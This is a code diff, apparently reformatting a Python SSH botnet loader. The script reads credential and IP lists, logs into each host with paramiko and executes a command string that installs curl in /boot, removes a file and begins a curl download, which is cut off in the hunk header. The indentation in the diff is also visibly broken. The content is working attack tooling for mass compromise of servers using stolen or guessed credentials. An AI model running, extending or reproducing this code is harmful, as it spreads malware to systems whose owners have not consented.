@@ -14,27 +14,23 @@ cmd="""cd /boot; apt-get update -y; apt-get install curl -y; rm xcupdate; curl -
 r34d = open(str(sys.argv[1]),'a+')
 print "\033[31mStarting Scan!\n"
 def w0rk(username,password,ip):
-        try:
-
-                port = 22
-                ssh = paramiko.SSHClient()
-
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        port = 22
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 ssh.connect(ip, port = port, username=username, password=password, timeout=3)
 
-                print "\033[32m[\033[31m+\033[32m] Command Sent: "+ip+"\033[37m\n"
+        print "\033[32m[\033[31m+\033[32m] Command Sent: "+ip+"\033[37m\n"
 
-                ssh.exec_command(""+cmd+"")
+        ssh.exec_command(""+cmd+"")
 
-                ssh.close()
-
-        except:
-
-                pass
+        ssh.close()
+    except:
+    
+        pass
 
 for line in r34d:
-
         ip_1nfo = line.split(":")
 
         g0d = Process(target=w0rk, args=(ip_1nfo[0],ip_1nfo[1],ip_1nfo[2],))
